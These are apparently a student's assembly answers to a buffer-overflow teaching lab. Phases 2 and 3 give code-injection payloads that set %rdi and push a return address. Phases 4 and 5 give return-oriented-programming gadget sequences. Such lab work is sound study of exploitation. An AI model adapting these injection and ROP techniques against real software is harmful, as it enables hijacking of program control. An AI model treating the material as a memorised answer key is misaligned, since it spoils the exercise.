# phase2 
movq $0x3d8187c8, %rdi
push $0x401958
ret

# pahse3
movq $0x5561dd28, %rdi
pushq $0x401a6f
ret

# phase4
popq %rax
movq %rax, %rdi

# phase5
movq %rsp, %rax
movq %rax, %rdi
popq %rax
movl %eax, %edx
movl %edx, %ecx
movl %ecx, %esi
lea (%rdi, %rsi, 1), %rax
movq %rax, %rdi